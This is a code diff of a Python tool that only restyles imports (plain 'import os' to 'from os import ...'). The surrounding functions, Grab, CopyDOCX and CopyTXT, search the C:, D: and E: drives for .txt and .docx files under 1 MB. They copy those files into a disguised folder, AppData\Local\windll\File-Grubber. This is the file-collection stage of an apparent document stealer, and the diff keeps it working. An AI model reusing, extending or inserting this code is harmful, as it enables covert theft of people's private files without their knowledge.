@@ -14,10 +14,10 @@
 """
 All imports
 """
-import os
-import shutil
-import pathlib
-import os.path
+from shutil import copy2
+from pathlib import Path
+from os.path import getsize
+from os import environ,sep,chdir,makedirs
 
 
 """
@@ -30,9 +30,9 @@ def CopyDOCX(flist, path, count):
             num = flist[i].rfind("\\")
             fname = flist[i][num+1:]
             print(flist[i])
-            size = os.path.getsize(flist[i])
+            size = getsize(flist[i])
             if size < 1000000:
-                shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-5]}___{count}.docx')
+                copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-5]}___{count}.docx')
         except Exception as e:
                 print(e)
     print("done")
@@ -50,9 +50,9 @@ def CopyTXT(flist, path, count):
             num = flist[i].rfind("\\")
             fname = flist[i][num+1:]
             print(flist[i])
-            size = os.path.getsize(flist[i])
+            size = getsize(flist[i])
             if size < 1000000:
-                shutil.copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-4]}___{count}.txt')
+                copy2(flist[i],rf'{path}\windll\File-Grubber\{fname[:-4]}___{count}.txt')
         except Exception as e:
                 print(e)
     print("done")
@@ -64,11 +64,11 @@ def CopyTXT(flist, path, count):
 main function
 """
 def Grab(data):
-    os.chdir("C:")
+    chdir("C:")
     try:
-        mainPath = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
+        mainPath = environ['USERPROFILE'] + sep + r'AppData\Local'
         try:
-            os.makedirs(rf'{mainPath}\windll\File-Grubber')
+            makedirs(rf'{mainPath}\windll\File-Grubber')
         except:
             pass
         try:
@@ -88,27 +88,27 @@ def Grab(data):
             get all paths to files
             """
             try:
-                filesTXT_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt))
+                filesTXT_С = list(str(_) for _ in Path(fileDir).glob(fileExt))
             except Exception as e:
                 print(e)
             try:
-                filesDOCX_С = list(str(_) for _ in pathlib.Path(fileDir).glob(fileExt1))
+                filesDOCX_С = list(str(_) for _ in Path(fileDir).glob(fileExt1))
             except Exception as e:
                 print(e)
             try:
-                filesTXT_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt))
+                filesTXT_D = list(str(_) for _ in Path(fileDir1).glob(fileExt))
             except Exception as e:
                 print(e)
             try:
-                filesDOCX_D = list(str(_) for _ in pathlib.Path(fileDir1).glob(fileExt1))
+                filesDOCX_D = list(str(_) for _ in Path(fileDir1).glob(fileExt1))
             except Exception as e:
                 print(e)
             try:
-                filesTXT_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt))
+                filesTXT_E = list(str(_) for _ in Path(fileDir2).glob(fileExt))
             except Exception as e:
                 print(e)
             try:
-                filesDOCX_E = list(str(_) for _ in pathlib.Path(fileDir2).glob(fileExt1))
+                filesDOCX_E = list(str(_) for _ in Path(fileDir2).glob(fileExt1))
             except Exception as e:
                 print(e)
             """
